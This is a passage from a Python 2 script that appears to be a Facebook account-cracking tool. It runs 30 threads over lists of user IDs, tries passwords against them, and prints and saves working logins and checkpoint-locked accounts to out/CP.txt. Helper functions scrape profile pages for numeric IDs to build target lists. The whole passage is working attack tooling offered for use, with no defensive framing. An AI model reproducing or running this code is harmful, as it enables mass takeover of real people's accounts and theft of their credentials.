																print '\033[1;94m[\033[1;92mOK\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;94m[\033[1;93mCP\033[1;94m] \033[1;97m' + user  + '\033[1;91m>\033[1;97m' + pass7 + '\033[1;91m>\033[1;97m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97mok\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/Techabm.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

def user_id():
    os.system('clear')
    print logo
    print '\x1b[1;91m>>>>>>>>>\x1b[1;93mID Not Found Problem Solve\x1b[1;91m>>>>>>>>>\x1b[1;0m' 
    print '\x1b[1;97m--------------------------------------------\xc2\xbb'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Username : ')
    print '\x1b[1;97m \xc2\xab--------------------------------------------\xc2\xbb'
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
    menu()

def user_us():
    os.system('clear')
    print logo
    print '\x1b[1;91m>>>>>>>>>\x1b[1;93mID Not Found Problem Solve\x1b[1;91m>>>>>>>>>\x1b[1;0m' 
    print '\x1b[1;97m--------------------------------------------\xc2\xbb'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Username : ')
    print '\x1b[1;97m--------------------------------------------\xc2\xbb'
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
    menu()

if __name__ == '__main__':
    menu()

